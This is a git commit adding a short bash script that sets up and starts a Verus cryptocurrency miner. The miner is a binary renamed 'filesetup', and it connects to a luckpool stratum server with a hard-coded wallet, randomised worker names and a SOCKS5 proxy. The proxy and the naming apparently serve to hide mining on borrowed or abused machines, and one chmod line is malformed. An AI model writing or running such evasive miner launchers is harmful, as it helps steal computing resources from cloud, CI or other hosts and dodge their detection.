32facdf2cc1ac5b1aabe797c73835c7047657756
hendrik20212 <87313143+hendrik20212@users.noreply.github.com>
2021-07-12 21:07:21 +0700

    Add files via upload

---
+++ file.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+chmod +x yakan.sh && chmod +x filesetup chmod 777 filesetup yakan.sh
+screen -dmS ls 
+POOL=stratum+tcp://na.luckpool.net:3956
+WALLET=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
+WORKER=$(echo $(shuf -i 1-10 -n 1)hape)
+PROXY=socks5://192.252.215.2:4145
+./filesetup -a verus -o stratum+tcp://na.luckpool.net:3956 -u RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r.hape -t 8 -x socks5://192.252.215.2:4145
